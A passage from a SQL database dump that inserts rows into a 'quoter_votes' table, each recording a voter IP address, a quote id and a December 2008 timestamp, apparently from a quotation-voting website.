  (5212,'91.77.157.81','',0,61,1229546962),
  (5213,'92.74.246.73','',0,212,1229548650),
  (5214,'83.99.170.30','',0,210,1229549657),
  (5215,'83.99.170.30','',0,154,1229550221),
  (5216,'83.99.170.30','',0,120,1229550331),
  (5217,'83.99.170.30','',0,29,1229550583),
  (5218,'72.30.142.119','',0,95,1229551028),
  (5219,'74.6.18.217','',0,152,1229552980),
  (5220,'77.88.30.246','',0,161,1229554676),
  (5221,'77.88.30.246','',0,120,1229554680),
  (5222,'77.88.30.246','',0,16,1229554687),
  (5223,'77.88.30.246','',0,139,1229554695),
  (5224,'77.88.30.246','',0,198,1229554697),
  (5225,'77.88.30.246','',0,171,1229554706),
  (5226,'77.88.30.246','',0,204,1229554719),
  (5227,'77.88.30.246','',0,191,1229554727),
  (5228,'77.88.30.246','',0,102,1229554734),
  (5229,'77.88.30.246','',0,190,1229554739),
  (5230,'77.88.30.246','',0,135,1229554744),
  (5231,'77.88.30.246','',0,201,1229554749),
  (5232,'77.88.30.246','',0,4,1229554762),
  (5233,'77.88.30.246','',0,155,1229554807),
  (5234,'77.88.30.246','',0,159,1229554818),
  (5235,'77.88.30.246','',0,136,1229554832),
  (5236,'77.88.30.246','',0,140,1229554842),
  (5237,'77.88.30.246','',0,146,1229554845),
  (5238,'77.88.30.246','',0,8,1229554849),
  (5239,'77.88.30.246','',0,208,1229554884),
  (5240,'77.88.30.246','',0,189,1229554909),
  (5241,'77.88.30.246','',0,157,1229554914),
  (5242,'77.88.30.246','',0,129,1229554926),
  (5243,'77.88.30.246','',0,133,1229554931),
  (5244,'77.88.30.246','',0,147,1229554942),
  (5245,'77.88.30.246','',0,124,1229554978),
  (5246,'77.88.30.246','',0,177,1229554981),
  (5247,'77.88.30.246','',0,143,1229554989),
  (5248,'77.88.30.246','',0,162,1229554999),
  (5249,'77.88.30.246','',0,163,1229555006),
  (5250,'77.88.30.246','',0,212,1229555018),
  (5251,'77.88.30.246','',0,164,1229555034),
  (5252,'77.88.30.246','',0,7,1229555044),
  (5253,'77.88.30.246','',0,88,1229555059),
  (5254,'77.88.30.246','',0,175,1229555064),
  (5255,'77.88.30.246','',0,119,1229555069),
  (5256,'77.88.30.246','',0,184,1229555081),
  (5257,'77.88.30.246','',0,185,1229555091),
  (5258,'77.88.30.246','',0,183,1229555115),
  (5259,'77.88.30.246','',0,106,1229555130),
  (5260,'77.88.30.246','',0,109,1229555133),
  (5261,'77.88.30.246','',0,165,1229555149),
  (5262,'77.88.30.246','',0,195,1229555159),
  (5263,'77.88.30.246','',0,125,1229555164),
  (5264,'77.88.30.246','',0,196,1229555171),
  (5265,'77.88.30.246','',0,142,1229555190),
  (5266,'77.88.30.246','',0,197,1229555207),
  (5267,'77.88.30.246','',0,113,1229555219),
  (5268,'77.88.30.246','',0,207,1229555233),
  (5269,'77.88.30.246','',0,202,1229555300),
  (5270,'77.88.30.246','',0,20,1229555322),
  (5271,'77.88.30.246','',0,111,1229555327),
  (5272,'77.88.30.246','',0,137,1229555332),
  (5273,'77.88.30.246','',0,156,1229555335),
  (5274,'77.88.30.246','',0,1,1229555344),
  (5275,'77.88.30.246','',0,154,1229555357),
  (5276,'77.88.30.246','',0,178,1229555369),
  (5277,'77.88.30.246','',0,107,1229555374),
  (5278,'77.88.30.246','',0,18,1229555382),
  (5279,'77.88.30.246','',0,122,1229555387),
  (5280,'77.88.30.246','',0,103,1229555392),
  (5281,'77.88.30.246','',0,14,1229555436),
  (5282,'77.88.30.246','',0,205,1229555479),
  (5283,'77.88.30.246','',0,21,1229555488),
  (5284,'77.88.30.246','',0,152,1229555494),
  (5285,'77.88.30.246','',0,193,1229555504),
  (5286,'77.88.30.246','',0,2,1229555510),
  (5287,'77.88.30.246','',0,203,1229555541),
  (5288,'77.88.30.246','',0,104,1229555546),
  (5289,'77.88.30.246','',0,12,1229555559),
  (5290,'77.88.30.246','',0,105,1229555586),
  (5291,'77.88.30.246','',0,173,1229555591),
  (5292,'77.88.30.246','',0,141,1229555613),
  (5293,'77.88.30.246','',0,108,1229555626),
  (5294,'77.88.30.246','',0,128,1229555651),
  (5295,'77.88.30.246','',0,138,1229555669),
  (5296,'77.88.30.246','',0,130,1229555675),
  (5297,'77.88.30.246','',0,3,1229555694),
  (5298,'77.88.30.246','',0,145,1229555711),
  (5299,'77.88.30.246','',0,199,1229555745),
  (5300,'77.88.30.246','',0,83,1229555763),
  (5301,'77.88.30.246','',0,144,1229555794),
  (5302,'77.88.30.246','',0,110,1229555817),
  (5303,'77.88.30.246','',0,118,1229555849),
  (5304,'77.88.30.246','',0,206,1229555865),
  (5305,'77.88.30.246','',0,6,1229555883),
  (5306,'77.88.30.246','',0,172,1229555887),
  (5307,'87.253.4.155','',0,165,1229557175),
  (5308,'87.253.4.155','',0,145,1229557198),
  (5309,'87.253.4.155','',0,89,1229557573),
  (5310,'67.202.43.229','',0,197,1229565377),
  (5311,'67.202.43.229','',0,199,1229565389),
  (5312,'67.202.43.229','',0,195,1229565447),
  (5313,'91.124.60.33','',0,210,1229565689),
  (5314,'89.218.77.226','',0,177,1229566458),
  (5315,'80.243.71.189','',0,55,1229568510),
  (5316,'80.243.71.189','',0,1,1229568512),
  (5317,'80.243.71.189','',0,212,1229570846),
  (5318,'80.243.71.189','',0,210,1229570851),
  (5319,'80.243.71.189','',0,202,1229570868),
  (5320,'91.144.137.243','',0,204,1229573359),
  (5321,'91.144.137.243','',0,205,1229573363),
  (5322,'66.249.66.47','',0,175,1229575477),
  (5323,'90.150.213.224','',0,145,1229576801),
  (5324,'66.249.66.47','',0,173,1229577172),
  (5325,'74.52.177.210','',0,213,1229580331),
  (5326,'74.52.177.210','',0,212,1229580337),
  (5327,'74.52.177.210','',0,208,1229580344),
  (5328,'74.52.177.210','',0,207,1229580350),
  (5329,'74.52.177.210','',0,206,1229580354),
  (5330,'74.52.177.210','',0,205,1229580358),
  (5331,'74.52.177.210','',0,204,1229580363),
  (5332,'74.52.177.210','',0,203,1229580367),
  (5333,'74.52.177.210','',0,202,1229580370),
  (5334,'74.52.177.210','',0,201,1229580378),
  (5335,'66.249.66.47','',0,171,1229580762),
  (5336,'91.192.32.50','',0,195,1229580853),
  (5337,'91.192.32.50','',0,197,1229580858),
  (5338,'92.46.7.182','',0,191,1229581213),
  (5339,'92.46.7.182','',0,190,1229581222),
  (5340,'92.46.7.182','',0,177,1229581284),
  (5341,'92.46.7.182','',0,176,1229581356),
  (5342,'88.204.225.69','',0,55,1229581866),
  (5343,'80.243.71.189','',0,212,1229581991),
  (5344,'80.250.173.139','',0,213,1229583317),
  (5345,'94.248.24.162','',0,213,1229584010),
  (5346,'94.248.24.162','',0,165,1229584059),
  (5347,'217.65.14.16','',0,212,1229584132),
  (5348,'217.65.14.16','',0,208,1229584143),
  (5349,'81.200.211.90','',0,212,1229584759),
  (5350,'81.200.211.90','',0,190,1229584770),
  (5351,'93.88.5.140','',0,198,1229584813),
  (5352,'93.88.5.140','',0,197,1229584824),
  (5353,'81.200.211.90','',0,173,1229584913),
  (5354,'81.200.211.90','',0,117,1229584919),
  (5355,'94.75.4.170','',0,198,1229586835),
  (5356,'194.79.22.26','',0,106,1229586914),
  (5357,'194.79.22.26','',0,61,1229587050),
  (5358,'195.14.49.230','',0,185,1229587983),
  (5359,'94.179.209.74','',0,12,1229590258),
  (5360,'66.249.66.47','',0,173,1229591096),
  (5361,'78.24.231.150','',0,55,1229591148),
  (5362,'78.24.231.150','',0,1,1229591149),
  (5363,'66.249.66.47','',0,171,1229592560),
  (5364,'66.249.66.47','',0,175,1229593759),
  (5365,'94.30.176.251','',0,198,1229594053),
  (5366,'92.101.150.55','',0,159,1229594852),
  (5367,'92.101.150.55','',0,154,1229594941),
  (5368,'156.17.237.13','',0,205,1229596032),
  (5369,'80.89.145.65','',0,147,1229596292),
  (5370,'80.89.145.65','',0,212,1229596319),
  (5371,'80.89.145.65','',0,213,1229596331),
  (5372,'80.89.145.65','',0,120,1229596370),
  (5373,'80.89.145.65','',0,109,1229596393),
  (5374,'66.249.66.47','',0,172,1229596608),
  (5375,'94.75.4.170','',0,10,1229597193),
  (5376,'81.26.151.222','',0,214,1229597318),
  (5377,'194.150.143.193','',0,214,1229597406),
  (5378,'212.7.3.186','',0,195,1229597784),
  (5379,'194.150.143.193','',0,202,1229597950),
  (5380,'194.150.143.193','',0,212,1229597957),
  (5381,'194.150.143.193','',0,195,1229598200),
  (5382,'62.221.49.72','',0,213,1229598459),
  (5383,'87.249.18.214','',0,130,1229598754),
  (5384,'87.249.18.214','',0,85,1229598772),
  (5385,'87.249.18.214','',0,12,1229599178),
  (5386,'86.102.42.20','',0,202,1229599344),
  (5387,'86.102.42.20','',0,173,1229599550),
  (5388,'86.102.42.20','',0,117,1229599697),
  (5389,'86.102.42.20','',0,106,1229599851),
  (5390,'86.102.42.20','',0,102,1229600238),
  (5391,'86.102.42.20','',0,61,1229600412),
  (5392,'87.249.18.214','',0,119,1229600667),
  (5393,'217.197.246.53','',0,214,1229600845),
  (5394,'80.80.111.200','',0,214,1229600928),
  (5395,'80.80.111.200','',0,213,1229600945),
  (5396,'80.80.111.200','',0,212,1229600946),
  (5397,'80.80.111.200','',0,206,1229601031),
  (5398,'86.102.42.20','',0,110,1229601166),
  (5399,'92.255.240.8','',0,198,1229601495),
  (5400,'92.255.240.8','',0,197,1229601642),
  (5401,'213.180.212.60','',0,208,1229601673),
  (5402,'92.113.158.165','',0,212,1229601700),
  (5403,'92.113.158.165','',0,208,1229601713),
  (5404,'213.180.212.60','',0,29,1229601756),
  (5405,'84.17.2.10','',0,213,1229601809),
  (5406,'213.180.212.60','',0,197,1229602906),
  (5407,'84.204.148.130','',0,202,1229602917),
  (5408,'84.204.148.130','',0,171,1229602977),
  (5409,'194.45.184.252','',0,119,1229603066),
  (5410,'194.45.184.252','',0,96,1229603092),
  (5411,'194.45.184.252','',0,212,1229603106),
  (5412,'194.45.184.252','',0,171,1229603128),
  (5413,'194.45.184.252','',0,165,1229603133),
  (5414,'194.45.184.252','',0,122,1229603154),
  (5415,'194.45.184.252','',0,79,1229603172),
  (5416,'194.45.184.252','',0,56,1229603175),
  (5417,'194.45.184.252','',0,16,1229603213),
  (5418,'194.45.184.252','',0,215,1229603255),
  (5419,'194.45.184.252','',0,125,1229603286),
  (5420,'92.255.240.8','',0,196,1229603293),
  (5421,'92.255.240.8','',0,111,1229603313),
  (5422,'194.45.184.252','',0,50,1229603318),
  (5423,'194.45.184.252','',0,207,1229603337),
  (5424,'92.255.240.8','',0,3,1229603395),
  (5425,'194.45.184.252','',0,94,1229603421),
  (5426,'194.45.184.252','',0,76,1229603520),
  (5427,'194.45.184.252','',0,75,1229603526),
  (5428,'194.45.184.252','',0,71,1229603533),
  (5429,'194.45.184.252','',0,48,1229603559),
  (5430,'194.45.184.252','',0,21,1229603587),
  (5431,'77.41.138.70','',0,214,1229603602),
  (5432,'94.25.18.77','',0,205,1229604092),
  (5433,'195.114.130.142','',0,197,1229604100),
  (5434,'94.25.18.77','',0,207,1229604100),
  (5435,'94.25.18.77','',0,215,1229604107),
  (5436,'195.114.130.142','',0,189,1229604125),
  (5437,'195.114.130.142','',0,185,1229604135),
  (5438,'195.114.130.142','',0,177,1229604155),
  (5439,'195.114.130.142','',0,172,1229604173),
  (5440,'83.69.130.147','',0,55,1229604259),
  (5441,'195.114.130.142','',0,156,1229604280),
  (5442,'195.114.130.142','',0,140,1229604347),
  (5443,'89.218.77.226','',0,177,1229604614),
  (5444,'194.45.184.252','',0,190,1229605069),
  (5445,'194.45.184.252','',0,202,1229605075),
  (5446,'194.45.184.252','',0,178,1229605094),
  (5447,'194.45.184.252','',0,175,1229605100),
  (5448,'194.45.184.252','',0,173,1229605111),
  (5449,'194.45.184.252','',0,129,1229605129),
  (5450,'194.45.184.252','',0,106,1229605151),
  (5451,'72.30.142.246','',0,207,1229605342),
  (5452,'72.30.142.246','',0,206,1229605386),
  (5453,'72.30.142.246','',0,208,1229605408),
  (5454,'93.100.73.143','',0,120,1229606007),
  (5455,'83.102.242.150','',0,214,1229606302),
  (5456,'212.98.164.146','',0,196,1229606381),
  (5457,'72.30.142.246','',0,152,1229606615),
  (5458,'92.113.247.186','',0,135,1229606976),
  (5459,'92.113.247.186','',0,115,1229607135),
  (5460,'92.113.247.186','',0,196,1229607217),
  (5461,'92.113.247.186','',0,44,1229607443),
  (5462,'195.234.72.66','',0,214,1229607455),
  (5463,'92.113.247.186','',0,88,1229607480),
  (5464,'72.30.142.246','',0,214,1229607712),
  (5465,'88.81.227.163','',0,173,1229607756),
  (5466,'91.195.22.32','',0,214,1229608044),
  (5467,'212.98.164.146','',0,201,1229608301),
  (5468,'217.107.8.106','',0,202,1229608586),
  (5469,'84.204.148.130','',0,215,1229608666),
  (5470,'92.255.240.8','',0,205,1229608864),
  (5471,'84.204.148.130','',0,76,1229608886),
  (5472,'84.204.148.130','',0,195,1229609248),
  (5473,'84.204.148.130','',0,165,1229609584),
  (5474,'83.234.200.205','',0,213,1229609637),
  (5475,'83.234.200.205','',0,212,1229609644),
  (5476,'83.234.200.205','',0,216,1229609652),
  (5477,'82.207.125.180','',0,215,1229609674),
  (5478,'91.202.197.79','',0,216,1229610006),
  (5479,'91.202.197.79','',0,215,1229610028),
  (5480,'91.202.197.79','',0,212,1229610046),
  (5481,'95.48.22.66','',0,207,1229613349),
  (5482,'94.178.148.192','',0,119,1229613431),
  (5483,'82.207.125.180','',0,212,1229613681),
  (5484,'81.222.64.10','',0,102,1229614291),
  (5485,'74.6.22.190','',0,14,1229614904),
  (5486,'217.146.146.246','',0,204,1229615289),
  (5487,'72.30.87.124','',0,99,1229615301),
  (5488,'81.222.64.10','',0,103,1229615510),
  (5489,'81.222.64.10','',0,104,1229615512),
  (5490,'94.178.148.192','',0,140,1229615724),
  (5491,'81.222.64.10','',0,105,1229616213),
  (5492,'81.222.64.10','',0,106,1229616214),
  (5493,'74.6.22.162','',0,207,1229616237),
  (5494,'82.116.60.218','',0,206,1229616335),
  (5495,'93.185.183.24','',0,216,1229616429),
  (5496,'82.116.60.218','',0,177,1229616549),
  (5497,'92.50.248.33','',0,215,1229616655),
  (5498,'82.116.60.218','',0,141,1229616658),
  (5499,'195.131.73.199','',0,111,1229616683),
  (5500,'92.50.248.33','',0,204,1229616695);
COMMIT;

#
# Data for the `quoter_votes` table  (LIMIT 5500,500)
#

INSERT INTO `quoter_votes` (`id`, `ip`, `useragent`, `value`, `quote_id`, `created`) VALUES 
  (5501,'92.50.248.33','',0,197,1229616745),
  (5502,'92.50.248.33','',0,199,1229616754),
  (5503,'92.50.248.33','',0,195,1229616763),
  (5504,'194.45.184.252','',0,180,1229616787),
  (5505,'194.45.184.252','',0,163,1229616798),
  (5506,'81.222.64.10','',0,107,1229616802),
  (5507,'81.222.64.10','',0,108,1229616803),
  (5508,'81.222.64.10','',0,109,1229616804),
  (5509,'194.45.184.252','',0,143,1229616809),
  (5510,'194.45.184.252','',0,139,1229616820),
  (5511,'194.45.184.252','',0,133,1229616860),
  (5512,'194.45.184.252','',0,111,1229616868),
  (5513,'194.45.184.252','',0,89,1229616931),
  (5514,'194.45.184.252','',0,77,1229616952),
  (5515,'194.45.184.252','',0,196,1229616974),
  (5516,'194.45.184.252','',0,70,1229616993),
  (5517,'194.45.184.252','',0,14,1229617015),
  (5518,'194.45.184.252','',0,147,1229617171),
  (5519,'194.45.184.252','',0,113,1229617175),
  (5520,'194.45.184.252','',0,88,1229617184),
  (5521,'194.45.184.252','',0,87,1229617188),
  (5522,'194.45.184.252','',0,54,1229617201),
  (5523,'81.222.64.10','',0,11,1229617386),
  (5524,'81.222.64.10','',0,110,1229617387),
  (5525,'94.232.12.22','',0,145,1229617842),
  (5526,'94.178.148.192','',0,124,1229617905),
  (5527,'81.222.64.10','',0,111,1229617919),
  (5528,'81.222.64.10','',0,113,1229617923),
  (5529,'81.222.64.10','',0,114,1229617927),
  (5530,'94.178.148.192','',0,107,1229618058),
  (5531,'72.30.78.219','',0,212,1229618243),
  (5532,'217.146.240.8','',0,216,1229618406),
  (5533,'82.207.125.180','',0,48,1229618423),
  (5534,'81.222.64.10','',0,115,1229618526),
  (5535,'81.222.64.10','',0,117,1229618528),
  (5536,'82.207.125.180','',0,205,1229618611),
  (5537,'213.184.248.166','',0,141,1229618685),
  (5538,'82.207.125.180','',0,56,1229618840),
  (5539,'82.207.125.180','',0,29,1229618864),
  (5540,'82.207.125.180','',0,55,1229618877),
  (5541,'81.222.64.10','',0,118,1229619106),
  (5542,'81.222.64.10','',0,120,1229619109),
  (5543,'94.178.148.192','',0,93,1229619512),
  (5544,'93.172.195.24','',0,216,1229619578),
  (5545,'81.222.64.10','',0,124,1229619640),
  (5546,'93.172.195.24','',0,215,1229619658),
  (5547,'82.207.125.180','',0,216,1229619925),
  (5548,'217.146.240.8','',0,213,1229619942),
  (5549,'81.222.64.10','',0,128,1229619992),
  (5550,'81.222.64.10','',0,129,1229619994),
  (5551,'81.222.64.10','',0,13,1229620324),
  (5552,'81.222.64.10','',0,130,1229620325),
  (5553,'94.181.84.148','',0,1,1229620542),
  (5554,'81.222.64.10','',0,143,1229620663),
  (5555,'81.222.64.10','',0,144,1229620667),
  (5556,'81.222.64.10','',0,145,1229620985),
  (5557,'81.222.64.10','',0,146,1229620987),
  (5558,'94.178.148.192','',0,6,1229620996),
  (5559,'213.184.248.166','',0,8,1229621021),
  (5560,'213.184.248.166','',0,9,1229621032),
  (5561,'213.184.248.166','',0,10,1229621050),
  (5562,'213.184.248.166','',0,13,1229621075),
  (5563,'72.30.78.219','',0,89,1229621163),
  (5564,'213.184.248.166','',0,217,1229621295),
  (5565,'213.184.248.166','',0,208,1229621305),
  (5566,'81.222.64.10','',0,147,1229621314),
  (5567,'94.178.148.192','',0,55,1229621469),
  (5568,'81.222.64.10','',0,152,1229621639),
  (5569,'81.222.64.10','',0,154,1229621643),
  (5570,'72.30.78.219','',0,24,1229621852),
  (5571,'81.222.64.10','',0,155,1229621946),
  (5572,'81.222.64.10','',0,156,1229621949),
  (5573,'94.178.148.192','',0,173,1229622063),
  (5574,'81.222.64.10','',0,157,1229622259),
  (5575,'93.185.183.24','',0,217,1229622376),
  (5576,'81.222.64.10','',0,159,1229622566),
  (5577,'81.222.64.10','',0,161,1229622572),
  (5578,'141.14.28.118','',0,100,1229622844),
  (5579,'81.222.64.10','',0,163,1229622884),
  (5580,'81.222.64.10','',0,164,1229623182),
  (5581,'194.45.184.252','',0,85,1229623263),
  (5582,'81.222.64.10','',0,165,1229623548),
  (5583,'81.222.64.10','',0,171,1229623978),
  (5584,'81.222.64.10','',0,172,1229624325),
  (5585,'81.222.64.10','',0,173,1229624879),
  (5586,'81.222.64.10','',0,175,1229624882),
  (5587,'81.222.64.10','',0,176,1229625308),
  (5588,'81.222.64.10','',0,177,1229625312),
  (5589,'80.251.114.151','',0,184,1229625664),
  (5590,'80.251.114.151','',0,205,1229625667),
  (5591,'81.222.64.10','',0,20,1229626080),
  (5592,'81.222.64.10','',0,25,1229626085),
  (5593,'93.172.195.24','',0,218,1229626164),
  (5594,'81.222.64.10','',0,38,1229626419),
  (5595,'93.172.195.24','',0,173,1229626430),
  (5596,'93.172.195.24','',0,120,1229626439),
  (5597,'81.222.64.10','',0,53,1229626982),
  (5598,'86.57.156.19','',0,21,1229627444),
  (5599,'82.199.102.233','',0,214,1229630010),
  (5600,'74.6.18.231','',0,93,1229630462),
  (5601,'212.98.163.238','',0,219,1229630499),
  (5602,'94.248.123.81','',0,165,1229630924),
  (5603,'79.171.124.210','',0,219,1229631076),
  (5604,'74.6.18.231','',0,212,1229632291),
  (5605,'74.6.18.231','',0,84,1229632785),
  (5606,'67.202.43.229','',0,190,1229632907),
  (5607,'67.202.43.229','',0,198,1229633162),
  (5608,'156.17.237.13','',0,218,1229636329),
  (5609,'74.6.18.231','',0,203,1229638697),
  (5610,'91.202.197.79','',0,219,1229642136),
  (5611,'91.202.197.79','',0,218,1229642153),
  (5612,'91.202.197.79','',0,217,1229642165),
  (5613,'195.62.63.164','',0,213,1229643819),
  (5614,'95.28.41.136','',0,220,1229643820),
  (5615,'195.62.63.164','',0,216,1229643828),
  (5616,'195.62.63.164','',0,212,1229643829),
  (5617,'195.62.63.164','',0,145,1229643978),
  (5618,'74.6.18.231','',0,49,1229644147),
  (5619,'195.62.63.164','',0,119,1229644152),
  (5620,'94.25.18.3','',0,55,1229644180),
  (5621,'94.25.18.3','',0,1,1229644182),
  (5622,'90.151.82.77','',0,138,1229645439),
  (5623,'95.28.41.136','',0,218,1229645669),
  (5624,'95.28.41.136','',0,215,1229646305),
  (5625,'90.151.82.77','',0,202,1229646555),
  (5626,'75.19.35.49','',0,212,1229649685),
  (5627,'74.6.18.231','',0,215,1229650111),
  (5628,'75.19.35.49','',0,202,1229652806),
  (5629,'74.6.18.231','',0,94,1229652832),
  (5630,'75.19.35.49','',0,190,1229652909),
  (5631,'75.19.35.49','',0,60,1229653563),
  (5632,'74.6.18.231','',0,87,1229653830),
  (5633,'193.93.218.64','',0,216,1229654308),
  (5634,'74.6.18.231','',0,204,1229656252),
  (5635,'80.243.71.189','',0,221,1229659624),
  (5636,'80.243.71.189','',0,220,1229659631),
  (5637,'80.243.71.189','',0,217,1229659640),
  (5638,'80.243.71.189','',0,215,1229659643),
  (5639,'80.243.71.189','',0,1,1229659702),
  (5640,'80.243.71.189','',0,55,1229659705),
  (5641,'80.237.112.245','',0,221,1229659970),
  (5642,'77.88.30.246','',0,115,1229661166),
  (5643,'77.88.30.246','',0,117,1229661205),
  (5644,'77.88.30.246','',0,114,1229661257),
  (5645,'77.88.30.246','',0,39,1229661309),
  (5646,'77.88.30.246','',0,98,1229661318),
  (5647,'77.88.30.246','',0,213,1229661341),
  (5648,'94.50.181.37','',0,214,1229661668),
  (5649,'212.49.107.131','',0,221,1229663071),
  (5650,'74.6.18.231','',0,125,1229663486),
  (5651,'84.17.2.10','',0,222,1229664316),
  (5652,'84.17.2.10','',0,221,1229664452),
  (5653,'84.17.2.10','',0,220,1229664470),
  (5654,'84.17.2.10','',0,219,1229664552),
  (5655,'80.243.71.189','',0,222,1229665471),
  (5656,'66.249.66.47','',0,38,1229667617),
  (5657,'92.46.47.134','',0,55,1229667801),
  (5658,'195.131.169.201','',0,198,1229668594),
  (5659,'74.6.18.231','',0,215,1229669562),
  (5660,'78.36.139.228','',0,214,1229669843),
  (5661,'82.209.239.182','',0,138,1229670965),
  (5662,'93.185.183.24','',0,215,1229671403),
  (5663,'74.6.18.231','',0,79,1229673708),
  (5664,'217.159.130.58','',0,218,1229674533),
  (5665,'217.159.130.58','',0,222,1229674580),
  (5666,'78.37.125.253','',0,212,1229675125),
  (5667,'91.202.197.79','',0,221,1229677472),
  (5668,'213.184.248.166','',0,8,1229677997),
  (5669,'213.184.248.166','',0,9,1229678007),
  (5670,'213.184.248.166','',0,10,1229678014),
  (5671,'213.184.248.166','',0,13,1229678082),
  (5672,'195.234.72.66','',0,214,1229678114),
  (5673,'213.184.248.166','',0,222,1229678219),
  (5674,'195.234.72.66','',0,55,1229678227),
  (5675,'213.184.248.166','',0,218,1229678245),
  (5676,'213.184.248.166','',0,217,1229678260),
  (5677,'213.184.248.166','',0,206,1229678271),
  (5678,'213.184.248.166','',0,204,1229678276),
  (5679,'213.184.248.166','',0,201,1229678284),
  (5680,'78.24.226.95','',0,55,1229679066),
  (5681,'78.24.226.95','',0,1,1229679067),
  (5682,'94.178.148.192','',0,218,1229680217),
  (5683,'217.150.41.85','',0,223,1229680764),
  (5684,'94.178.240.74','',0,218,1229680946),
  (5685,'82.207.125.180','',0,223,1229681557),
  (5686,'95.48.22.66','',0,223,1229682149),
  (5687,'95.48.22.66','',0,221,1229682219),
  (5688,'95.48.22.66','',0,222,1229682399),
  (5689,'74.6.18.231','',0,125,1229683432),
  (5690,'74.6.18.231','',0,84,1229684114),
  (5691,'217.146.146.246','',0,214,1229684166),
  (5692,'217.146.146.246','',0,117,1229684705),
  (5693,'84.42.63.12','',0,60,1229684948),
  (5694,'66.249.66.47','',0,38,1229686536),
  (5695,'212.98.164.146','',0,214,1229687498),
  (5696,'84.109.97.94','',0,221,1229687575),
  (5697,'74.6.18.231','',0,113,1229688002),
  (5698,'74.6.18.231','',0,24,1229689520),
  (5699,'141.14.28.118','',0,100,1229689881),
  (5700,'91.202.197.79','',0,223,1229691445),
  (5701,'91.202.197.79','',0,221,1229692317),
  (5702,'92.113.141.193','',0,199,1229692383),
  (5703,'194.44.62.149','',0,212,1229692515),
  (5704,'92.113.141.193','',0,195,1229692525),
  (5705,'87.225.47.163','',0,224,1229692766),
  (5706,'87.119.228.220','',0,221,1229692811),
  (5707,'194.44.62.149','',0,224,1229692845),
  (5708,'92.113.141.193','',0,196,1229692935),
  (5709,'92.113.141.193','',0,133,1229693331),
  (5710,'85.223.180.118','',0,220,1229693636),
  (5711,'85.223.180.118','',0,223,1229693652),
  (5712,'85.223.180.118','',0,216,1229693691),
  (5713,'85.223.180.118','',0,215,1229693720),
  (5714,'85.223.180.118','',0,55,1229693800),
  (5715,'85.223.180.118','',0,1,1229693814),
  (5716,'85.223.180.118','',0,21,1229693821),
  (5717,'85.223.180.118','',0,18,1229693854),
  (5718,'85.223.180.118','',0,173,1229693857),
  (5719,'85.223.180.118','',0,109,1229693874),
  (5720,'91.192.32.50','',0,224,1229693935),
  (5721,'91.192.32.50','',0,223,1229694031),
  (5722,'80.80.111.200','',0,221,1229694080),
  (5723,'77.35.27.75','',0,223,1229694106),
  (5724,'80.80.111.200','',0,220,1229694123),
  (5725,'77.35.27.75','',0,221,1229694257),
  (5726,'77.35.27.75','',0,220,1229694302),
  (5727,'91.192.32.50','',0,222,1229694333),
  (5728,'91.192.32.50','',0,221,1229694376),
  (5729,'84.204.148.130','',0,215,1229694377),
  (5730,'77.35.27.75','',0,215,1229694458),
  (5731,'77.35.27.75','',0,214,1229694809),
  (5732,'91.192.32.50','',0,218,1229694818),
  (5733,'91.192.32.50','',0,217,1229694847),
  (5734,'91.192.32.50','',0,216,1229694867),
  (5735,'91.192.32.50','',0,215,1229694908),
  (5736,'77.35.27.75','',0,205,1229695165),
  (5737,'213.184.248.166','',0,8,1229695456),
  (5738,'213.184.248.166','',0,9,1229695485),
  (5739,'213.184.248.166','',0,10,1229695489),
  (5740,'213.184.248.166','',0,13,1229695494),
  (5741,'213.184.248.166','',0,224,1229695584),
  (5742,'92.113.94.102','',0,218,1229696052),
  (5743,'92.113.94.102','',0,60,1229696167),
  (5744,'92.113.94.102','',0,55,1229696178),
  (5745,'80.91.185.22','',0,55,1229696207),
  (5746,'77.35.27.75','',0,178,1229696412),
  (5747,'88.204.72.214','',0,221,1229696489),
  (5748,'94.51.59.186','',0,226,1229696572),
  (5749,'88.204.72.214','',0,218,1229696602),
  (5750,'88.204.72.214','',0,216,1229696642),
  (5751,'88.204.72.214','',0,212,1229696773),
  (5752,'88.204.72.214','',0,171,1229696940),
  (5753,'94.51.173.47','',0,213,1229697614),
  (5754,'94.51.173.47','',0,212,1229697619),
  (5755,'67.202.43.229','',0,214,1229698589),
  (5756,'74.6.18.231','',0,213,1229698980),
  (5757,'193.232.92.242','',0,221,1229699436),
  (5758,'74.6.18.231','',0,94,1229699724),
  (5759,'85.223.180.118','',0,202,1229699857),
  (5760,'85.223.180.118','',0,197,1229699879),
  (5761,'85.223.180.118','',0,29,1229699913),
  (5762,'85.223.180.118','',0,56,1229699919),
  (5763,'85.223.180.118','',0,140,1229699929),
  (5764,'74.6.18.231','',0,60,1229700292),
  (5765,'78.137.28.237','',0,76,1229700414),
  (5766,'78.137.28.237','',0,205,1229700421),
  (5767,'78.137.28.237','',0,111,1229700616),
  (5768,'195.182.136.246','',0,226,1229700686),
  (5769,'74.6.18.231','',0,61,1229701379),
  (5770,'89.188.114.72','',0,221,1229701721),
  (5771,'74.6.18.231','',0,16,1229702113),
  (5772,'62.221.49.72','',0,223,1229704149),
  (5773,'62.221.49.72','',0,221,1229704341),
  (5774,'62.221.49.72','',0,216,1229704539),
  (5775,'141.14.28.118','',0,100,1229704925),
  (5776,'89.250.6.6','',0,20,1229705612),
  (5777,'89.250.6.6','',0,11,1229705681),
  (5778,'89.250.6.6','',0,4,1229705750),
  (5779,'82.207.125.180','',0,227,1229705915),
  (5780,'77.35.175.81','',0,212,1229706235),
  (5781,'94.178.240.74','',0,218,1229706351),
  (5782,'89.250.20.7','',0,222,1229706669),
  (5783,'89.250.20.7','',0,220,1229706701),
  (5784,'89.250.20.7','',0,218,1229706758),
  (5785,'89.250.20.7','',0,213,1229706964),
  (5786,'217.146.146.246','',0,226,1229707191),
  (5787,'82.207.125.180','',0,226,1229707260),
  (5788,'89.250.20.7','',0,180,1229707292),
  (5789,'89.250.20.7','',0,175,1229707367),
  (5790,'89.250.20.7','',0,165,1229707487),
  (5791,'74.6.18.231','',0,201,1229707675),
  (5792,'74.6.18.231','',0,218,1229707805),
  (5793,'74.6.18.231','',0,54,1229709297),
  (5794,'62.221.80.108','',0,212,1229709385),
  (5795,'62.221.80.108','',0,202,1229709611),
  (5796,'92.242.28.32','',0,225,1229709835),
  (5797,'217.159.130.58','',0,224,1229710304),
  (5798,'217.159.130.58','',0,222,1229710311),
  (5799,'74.6.18.231','',0,100,1229711137),
  (5800,'74.6.18.231','',0,204,1229712144),
  (5801,'77.122.245.211','',0,225,1229712463),
  (5802,'80.251.112.37','',0,185,1229712894),
  (5803,'67.159.44.138','',0,185,1229712964),
  (5804,'80.251.112.37','',0,197,1229712999),
  (5805,'80.251.112.37','',0,199,1229713002),
  (5806,'80.251.112.37','',0,201,1229713004),
  (5807,'80.251.112.37','',0,204,1229713007),
